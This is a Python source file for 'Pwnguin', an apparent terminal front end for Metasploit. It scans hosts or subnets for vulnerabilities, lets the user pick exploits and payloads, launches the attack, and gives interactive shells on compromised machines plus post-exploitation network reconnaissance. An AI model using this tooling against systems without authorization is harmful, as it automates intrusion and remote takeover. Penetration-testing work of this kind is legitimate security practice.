import re
import subprocess
from time import sleep
from pathlib import Path

import autopwn as autopwn
from pymetasploit3.msfrpc import (
    MsfRpcClient,
    ExploitModule,
    PayloadModule,
    ShellSession,
)
import post.postexploit as postexploit

from textual.app import App, ComposeResult
from textual.widgets import (
    Header,
    Footer,
    Static,
    Input,
    Label,
    ListItem,
    ListView,
    Tree,
    TabbedContent,
    TabPane,
    OptionList,
    Pretty,
    Button,
    Log,
    Collapsible,
    TextArea,
    Markdown,
)
from textual.widgets.tree import TreeNode
from textual import work, on, log
from textual.color import Color
from textual.containers import Container, Horizontal, ScrollableContainer
from textual.worker import get_current_worker
from rich.style import Style
from rich.text import Text

STATE = {
    "client": None,  # MsfRpcClient
    "action": None,  # 0 for computer scan, 1 for network scan
    "IP": None,
    "vulnerabilities": None,
    "vulnerability": None,  # index of the chosen vulnerability
    "exploits": None,
    "exploit": None,  # index of the chosen exploit
    "exploit_ms": None,  # Metasploit exploit object
    "payloads": None,
    "payload": None,  # index of the chosen payload
    "payload_ms": None,  # Metasploit payload object
}

RANK_COLORS = {
    "excellent": "red",
    "great": "orange",
    "good": "yellow",
    "normal": "green",
    "average": "blue",
    "low": "grey",
    "manual": "white",
}

vulnerabilities = [
    "Here are the vulns after being found",
]

exploits = [
    [
        "exploit/osx/local/setuid_tunnelblick",
        "excellent",
        "Here are the exploits of the vulns",
    ],
    [
        "exploit/multi/http/sflog_upload_exec",
        "normal",
        "Some exploits are better than others",
    ],
]

payloads = [
    "And finally the payloads of the choosen exploit",
]

networks = {}

actions = ["Scan computer", "Scan network"]


class Tile1(Static):

    def compose(self) -> ComposeResult:
        yield OptionList(*actions)

    def on_mount(self) -> None:
        self.border_title = "Action Type"

    @on(OptionList.OptionHighlighted)
    def show_selected(self, event: OptionList.OptionHighlighted) -> None:
        input = self.parent.query_one("#command", Input)
        if event.option_index == 1:
            input.placeholder = "Enter network with mask (default: 192.168.1.0/24)"
        elif event.option_index == 0:
            input.placeholder = "Enter computer IP (default: 127.0.0.1)"
        STATE["action"] = event.option_index

    @on(OptionList.OptionSelected)
    def give_focus(self, event: OptionList.OptionSelected) -> None:
        input = self.parent.query_one("#command", Input)
        input.focus()


class Tile2(Static):

    def compose(self) -> ComposeResult:
        yield Input(placeholder="command here", id="command")

    def on_mount(self) -> None:
        self.border_title = "Input"

    @on(Input.Submitted)
    def scan(self, text: str) -> None:
        input = self.query_one(Input)
        command = input.value
        input.value = ""
        if STATE["action"] == 0:
            if not command:
                command = "127.0.0.1"
            if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$").match(command):
                input.placeholder = "Wrong format (default: 127.0.0.1)"
                return
            self.perform_computer_scan(command)
        elif STATE["action"] == 1:
            if not command:
                command = "192.168.1.0/24"
            if not re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$").match(
                command
            ):
                input.placeholder = "Wrong format (default: 192.168.1.0/24)"
                return
            self.perform_network_scan(command)
        STATE["IP"] = command
        pretty = self.parent.query_one("#logs", Pretty)
        pretty.update("Scanning " + command)

    @work(exclusive=True, thread=True)
    def perform_computer_scan(self, ip: str) -> None:
        result = autopwn.scanIp4Vulnerabilities(ip=ip)
        # copy exploits to local
        autopwn.getEdbExploit(result, get_all=True)
        self.app.call_from_thread(self.parent.query_one("#logs", Pretty).update, result)

        (edbExploits, titles, metaexploits) = autopwn.createExploitList(result)
        titles = [title[1] for title in titles]

        STATE["vulnerabilities"] = edbExploits
        vuln_list = self.parent.query_one("#vuln_list", OptionList)
        self.app.call_from_thread(vuln_list.clear_options)
        self.app.call_from_thread(vuln_list.add_options, titles)
        tab = self.app.query_one(Tile5)
        self.app.call_from_thread(tab.set_active_tab, "vuln_tab")
        self.app.call_from_thread(vuln_list.focus)

    @work(exclusive=True, thread=True)
    def perform_network_scan(self, ip: str) -> None:
        result = postexploit.scanNetwork(ip)
        self.app.call_from_thread(self.parent.query_one("#logs", Pretty).update, result)
        networks[ip] = result
        self.app.call_from_thread(self.parent.query_one(Tile4).rebuild_tree)


class Tile3(Static):

    def compose(self) -> ComposeResult:
        yield Pretty("Nothing for now", id="logs")
        # yield LoadingIndicator()

    def on_mount(self) -> None:
        self.border_title = "What is happening ?"


class Tile4(Static):

    tree: Tree = None
    connected: TreeNode = None

    def compose(self) -> ComposeResult:
        tree: Tree[dict] = Tree("all/")
        self.tree = tree
        tree.root.expand()
        yield tree

    def on_mount(self) -> None:
        self.border_title = "Computers found"

    def rebuild_tree(self):
        self.tree.clear()
        for network in networks:
            network_node = self.tree.root.add(network, expand=True)
            for host in networks[network]:
                network_node.add_leaf(host)

    @on(Tree.NodeSelected)
    def on_tree_selected(self, event: Tree.NodeSelected) -> None:
        node = event.node
        # check if network or computer
        if "/" in str(node.label):
            return
        if self.connected == node:
            # disconnect/return to localhost
            self.connected.set_label(str(self.connected.label)[1:])
            self.connected = None
        elif self.connected != None:
            # connect from previous to next
            self.connected.set_label(str(self.connected.label)[1:])
            node.set_label("*" + str(node.label))
            self.connected = node
        else:
            # connect from local to remote
            node.set_label("*" + str(node.label))
            self.connected = node


class ComputerInfos(Static):

    mark: Markdown = None

    def compose(self) -> ComposeResult:
        self.mark = Markdown("")
        with ScrollableContainer():
            yield self.mark

    def on_mount(self) -> None:
        self.scan()

    @work(exclusive=True, thread=True)
    def scan(self):
        s = "##### Machine distribution\n"
        s += postexploit.getOS()
        s += "\n\n##### Interfaces"
        interfaces = postexploit.getTargetConnections()
        for inter in interfaces:
            s += "\n - " + inter[0] + ": " + inter[1]
        s += "\n\n..."
        self.app.call_from_thread(self.mark.update, s)
        s = s[:-3]
        arp = postexploit.getKnownARP()
        s += "##### ARP Table\n"
        s += "|IP|MAC|Interface|\n|-|-|-|\n"
        for a in arp:
            s += f"|{a['ip']}|{a['mac']}|{a['iface']}|\n"
        self.app.call_from_thread(self.mark.update, s)


class VulnChoice(Static):
    def compose(self) -> ComposeResult:
        with Container():
            yield OptionList(*vulnerabilities, id="vuln_list")

    @on(OptionList.OptionSelected)
    def select_vuln(self, event: OptionList.OptionSelected) -> None:
        STATE["vulnerability"] = event.option_index
        vuln = STATE["vulnerabilities"][event.option_index]
        if "Metasploit" in vuln["Title"]:
            modules = autopwn.searchModules(STATE["client"], vuln["Title"][:-12])
            STATE["exploits"] = modules

            exploitsList = self.app.query_one("#exploit_list", OptionList)
            exploitsList = exploitsList.clear_options()
            exploits = [
                Text(exploit["fullname"], style=RANK_COLORS[exploit["rank"]])
                for exploit in modules
            ]
            exploitsList.add_options(exploits)
            self.app.query_one(TabbedContent).active = "exploit_tab"
            exploitsList.focus()
        else:
            file_path = autopwn.convert_path(vuln["Path"])
            TEXT = Path(file_path).read_text()
            textArea = self.app.query_one(TextArea)
            textArea.clear()
            textArea.insert(TEXT)
            textArea.cursor_location = (0, 0)
            self.app.query_one(TabbedContent).active = "file_tab"


class ExploitMenu(Static):
    def compose(self) -> ComposeResult:
        options = [
            Text(exploit[2], Style(color=Color.parse(RANK_COLORS[exploit[1]]).hex))
            for exploit in exploits
        ]
        with Container():
            with Horizontal(classes="horizontal"):
                yield Label("Rankings:")
                for rank, color in RANK_COLORS.items():
                    yield Label(rank, classes=color)
            yield OptionList(*options, id="exploit_list")

    @on(OptionList.OptionSelected)
    def select_exploit(self, event: OptionList.OptionSelected) -> None:
        STATE["exploit"] = event.option_index
        exploit = STATE["exploits"][event.option_index]
        exploit_ms, compatible_payloads = autopwn.selectExploitMS(
            STATE["client"], exploit["fullname"]
        )
        STATE["exploit_ms"] = exploit_ms
        STATE["payloads"] = compatible_payloads
        payloadsList = self.app.query_one("#payload_list", OptionList)
        payloadsList.clear_options()
        payloadsList.add_options([Text(payload) for payload in compatible_payloads])
        self.app.query_one(TabbedContent).active = "payload_tab"
        payloadsList.focus()


class PayloadMenu(Static):
    def compose(self) -> ComposeResult:
        with Container():
            yield OptionList(*payloads, id="payload_list")

    @on(OptionList.OptionSelected)
    def select_payload(self, event: OptionList.OptionSelected) -> None:
        STATE["payload"] = event.option_index
        payload = STATE["payloads"][event.option_index]
        STATE["payload_ms"] = autopwn.selectPayloadMS(STATE["client"], payload)
        self.app.query_one(ParamMenu).create()
        self.app.query_one(TabbedContent).active = "param_tab"


class ParamMenu(Static):
    def compose(self) -> ComposeResult:
        with Container(id="params_container"):
            yield ListView(
                ListItem(Container(Label("Param 1"), Input(placeholder="value 1"))),
                ListItem(Container(Label("Param 2"), Input(placeholder="value 2"))),
                id="params_list",
            )
            yield Button.success("Attack !")

    @on(ListView.Selected)
    def select(self, event: ListView.Selected) -> None:
        event.item.query_one(Input).focus()

    @on(Input.Submitted)
    def submit(self, event: Input.Submitted) -> None:
        self.query_one(ListView).focus()

    @on(Button.Pressed)
    def pre_launch_attack(self, event: Button.Pressed) -> None:
        for list_item in self.query_one(ListView).children:
            param_name = str(list_item.query_one(Label).renderable)
            param_value = list_item.query_one(Input).value
            if param_name in STATE["exploit_ms"].options:
                STATE["exploit_ms"][param_name] = param_value
            else:
                STATE["payload_ms"][param_name] = param_value
        self.app.query_one("#logs", Pretty).update("Okayy let's goo !")
        self.launch_attack()

    @work(exclusive=True, thread=True)
    def launch_attack(self):
        client: MsfRpcClient = STATE["client"]
        exploit = STATE["exploit_ms"]
        payload = STATE["payload_ms"]
        exploit.execute(payload=payload)
        while len(client.jobs.list) != 0:
            pass
        self.app.call_from_thread(
            self.app.query_one("#logs", Pretty).update, client.sessions.list
        )
        all_sessions = client.sessions.list
        self.app.call_from_thread(
            self.app.query_one(ShellMenu).update_shells, all_sessions
        )

    def param_item_widget(self, name: str, placeholder) -> ListItem:
        return ListItem(Container(Label(name), Input(placeholder=placeholder)))

    def create(self):
        params_list = self.query_one("#params_list", ListView)
        params_list.clear()
        exploit: ExploitModule = STATE["exploit_ms"]
        payload: PayloadModule = STATE["payload_ms"]
        for param in exploit.missing_required:
            params_list.append(
                self.param_item_widget(param, exploit.info["options"][param]["desc"])
            )
        for param in payload.missing_required:
            params_list.append(
                self.param_item_widget(param, payload.info["options"][param]["desc"])
            )
        params_list.focus()


class ShellMenu(Static):

    def compose(self) -> ComposeResult:
        with ScrollableContainer(id="shells_container"):
            yield ListView(id="shells_list")

    def on_mount(self) -> None:
        self.children[0].can_focus = False

    def get_shells_info(self) -> dict:
        """get the info from the shells"""
        shellsList = self.query_one(ListView)
        children = shellsList.children
        shells_info = {}
        for child in children:
            label_str = child.query_one(Collapsible).title
            id = label_str.split(" ")[1].split(",")[0]
            shells_info[id] = {
                "tunnel_local": label_str.split(", ")[1].split(" ")[0],
                "tunnel_peer": label_str.split("-> ")[1],
                "base_log": "\n".join(child.query_one(Log).lines),
            }
        return shells_info

    def update_shells(self, new_shells: dict) -> None:
        """Add and remove the shells comparing the old and new ones"""
        current_shells = self.get_shells_info()
        # Remove shells that do not exist anymore
        current_shells = {
            id: shell for id, shell in current_shells.items() if id in new_shells.keys()
        }
        # Add new shells
        for new_id, new_shell in new_shells.items():
            if new_id not in current_shells.keys():
                current_shells[new_id] = {
                    "tunnel_local": new_shell["tunnel_local"],
                    "tunnel_peer": new_shell["tunnel_peer"],
                    "base_log": "",
                }

        shellsList = self.query_one(ListView)
        self.workers.cancel_group(self, "shells")
        shells = []
        for id, shell in current_shells.items():
            # Only recreate the ones that are still in the new shells, remove the others
            if id in new_shells.keys():
                new_log = Log().write(shell["base_log"])
                new_collasible = Collapsible(
                    Input(placeholder="command"),
                    new_log,
                    title=f"Shell {id}, {shell['tunnel_local']} -> {shell['tunnel_peer']}",
                )
                self.read_shell_log(
                    STATE["client"].sessions.session(id), new_collasible, new_log
                )
                shells += [ListItem(new_collasible)]

        shellsList.clear()
        shellsList.extend(shells)
        self.parent.parent.parent.active = "shell_tab"
        shellsList.focus()

    @on(ListView.Highlighted)
    def open_collapse(self, event: ListView.Highlighted) -> None:
        if event.item is None:
            return
        for listItem in self.query_one(ListView).children:
            listItem.query_one(Collapsible).collapsed = True
        event.item.query_one(Collapsible).collapsed = False
        event.item.query_one(Input).focus()

    @on(ListView.Selected)
    def select_collapse(self, event: ListView.Selected) -> None:
        event.item.query_one(Collapsible).collapsed = False
        event.item.query_one(Input).focus()

    # TODO change read primitive, read in a while true loop per shell instead of one thread per command ?
    @on(Input.Submitted)
    def exec(self, event: Input.Submitted) -> None:
        """Execute one command in the shell, read the output, show it in the log"""
        cmd = event.input.value
        event.input.value = ""
        collapsible: Collapsible = event.input.parent.parent
        label = collapsible.title
        log = collapsible.query_one(Log)
        log.write_line(f"$ {cmd}")
        id = label.split(" ")[1].split(",")[0]
        self.write_shell(id, cmd)

    @work(thread=True)
    def write_shell(self, id: str, cmd: str) -> None:
        client: MsfRpcClient = STATE["client"]
        shell: ShellSession = client.sessions.session(id)
        shell.write(cmd)

    @work(thread=True, group="shells")
    def read_shell_log(
        self, shell: ShellSession, collaspible: Collapsible, log: Log
    ) -> None:
        worker = get_current_worker()
        while not worker.is_cancelled:
            if not collaspible.collapsed:
                s = shell.read()
                if s:
                    self.app.call_from_thread(log.write_line, s)
            sleep(0.1)


class Tile5(Static):
    def compose(self) -> ComposeResult:
        with TabbedContent():
            with TabPane("Connections", id="connect_tab"):
                yield ComputerInfos()
            with TabPane("Vulnerabilities", id="vuln_tab"):
                yield VulnChoice()
            with TabPane("Exploit Menu", id="exploit_tab"):
                yield ExploitMenu()
            with TabPane("Payload Menu", id="payload_tab"):
                yield PayloadMenu()
            with TabPane("Parameters", id="param_tab"):
                yield ParamMenu()
            with TabPane("Shells", id="shell_tab"):
                yield ShellMenu()
            with TabPane("File", id="file_tab"):
                yield Label(
                    "This tab is opened when automatic exploitation is not possible",
                    id="file_label",
                )
                yield TextArea.code_editor("", language="python")

    def on_mount(self) -> None:
        self.border_title = "Exploitation"
        self.query_one("#file_label", Label).styles.padding = (0, 1, 1, 1)

    def set_active_tab(self, active: str) -> None:
        self.query_one(TabbedContent).active = active


class Pwnguin(App):
    BINDINGS = [
        ("ctrl+t", "toggle_dark", "Toggle dark mode"),
    ]
    CSS_PATH = "interface.tcss"

    def compose(self) -> ComposeResult:
        yield Header()
        with Container(classes="grid"):
            yield Tile1(classes="tile centered", id="tile1")
            yield Tile2(classes="tile centered", id="tile2")
            yield Tile3(classes="tile", id="tile3")
            yield Tile4(classes="tile", id="tile4")
            yield Tile5(classes="tile", id="tile5")
        yield Footer()

    def on_mount(self) -> None:
        self.sub_title = "starting msfconsole..."
        self.init_app()

    @work(exclusive=True, thread=True)
    def init_app(self):
        client = autopwn.runMetasploit(reinit=True, show=False, wait=True)
        STATE["client"] = client
        self.app.call_from_thread(self.end_init)

    def end_init(self):
        self.sub_title = "ready for pwn"


if __name__ == "__main__":
    app = Pwnguin()
    app.run()
    subprocess.run("kill $(ps aux | grep 'msfrpcd' | awk '{print $2}')", shell=True)
